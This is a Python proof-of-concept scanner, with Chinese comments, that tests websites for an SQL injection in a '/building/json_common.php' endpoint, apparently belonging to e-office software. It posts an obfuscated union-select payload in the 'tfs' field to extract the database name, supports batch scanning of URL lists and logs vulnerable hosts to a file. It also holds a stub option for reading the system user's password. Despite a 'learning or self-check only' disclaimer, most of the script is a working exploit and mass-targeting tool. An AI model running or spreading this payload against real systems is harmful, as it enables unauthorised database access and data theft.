# _*_ coding:utf-8 _*_
# @Time : 2023/10/18 21:16
# @Author: 为赋新词强说愁
import requests
import argparse
from datetime import datetime
import time
requests.packages.urllib3.disable_warnings()
 
RED_BOLD = "\033[1;31m"
RESET = "\033[0m"
def usage():
    global RED_BOLD
    global RESET
    text = '''
    +-----------------------------------------------------------------+
    此脚本仅用于学习或系统自检查
    使用方法:
        单个 python3 json_commonSQLcheck.py -u url[例 http://127.0.0.1:8080]
        批量 python3 json_commonSQLcheck.py -f filename
    +-----------------------------------------------------------------+         
 
  
    '''
    print(f"{RED_BOLD}{text}{RESET}")
 
 
# proxies = {'http':'http://127.0.0.1:10808}
 
def exp(url):
    select = input("是否读取system用户密码（是：1,否：0):")
    # usage()
 
    if select == "1":
        pass
    elif select == "0":
        exit()
    else:
        print("请重新输入正确选项")
 
 
def save_file(url):
    with open('result.txt',mode='a',encoding='utf-8') as f:
        f.write(url+'\n')
 
def poc(check_url):
    now_poc = datetime.now()
    global RED_BOLD
    global RESET
    url = check_url + "/building/json_common.php"
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
        'Cookie': 'LOGIN_LANG=cn; PHPSESSID=bd702adc830fba4fbcf5f336471aeb2e',
        'DNT': '1',
        'Connection': 'close',
        'Upgrade-Insecure-Requests': '1',
    }
    data = {
        'tfs': 'city` where cityId =-1 /*!50000union*/ /*!50000select*/1,2,database() ,4#|2|333'
    }
    try:
        respnose = requests.post(url,headers=headers,data=data,timeout=6,verify=False)
        if respnose.status_code == 200 and 'eoffice' in respnose.text :
            print(f'{RED_BOLD}[+]{now_poc.strftime("%Y-%m-%d %H:%M:%S")}\t{check_url}\t漏洞存在{RESET}')
            save_file(check_url)
        else:
            print(f'[-]{now_poc.strftime("%Y-%m-%d %H:%M:%S")}\t{check_url}\t漏洞不存在')
 
    except Exception as e:
        print(f'[-]{now_poc.strftime("%Y-%m-%d %H:%M:%S")}\t{check_url}\t无法访问，请检查目标站点是否存在')
 
 
def run(filepath):
    flag = 0
    urls = [x.strip() for x in open(filepath, "r").readlines()]
    for u in urls:
        if 'http' in u:
            url = u
        elif 'https' in u:
            url = u
        else:
            url = 'http://' + u
 
        poc(url)
 
def main():
    parse = argparse.ArgumentParser()
    parse.add_argument("-u", "--url", help="python json_commonSQLcheck.py -u url")
    parse.add_argument("-f", "--file", help="python json_commonSQLcheck.py -f file")
    args = parse.parse_args()
    url = args.url
    filepath = args.file
    usage()
    time.sleep(1)
    if url is not None and filepath is None:
        flag = 1
        poc(url)
    elif url is None and filepath is not None:
        run(filepath)
    else:
        usage()
 
 
if __name__ == '__main__':
    main()